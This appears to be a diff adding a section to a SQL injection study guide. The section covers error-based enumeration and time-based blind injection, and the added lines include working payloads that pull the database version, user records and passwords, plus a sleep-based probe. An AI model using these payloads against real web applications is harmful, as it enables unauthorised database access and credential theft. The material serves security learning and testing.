@@ -94,6 +94,26 @@ And false
 
 ```
 
+To further expand on our attack, we could also take advantage of the error-based payload by enumerating the database directly.
+
+```sql
+' OR 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+```
+
+We want to force the SQL statement to create a database error that the web page will display back to us. In this case, we want to retrieve the MySQL version via the @@version directive.
+
+**Blind**
+
+We can achieve the same result by using a time-based SQLi payload:
+
+```sql
+' AND IF (1=1, sleep(3),'false') -- //
+```
+
+
+
 ### String based parameter injection
 
 ```
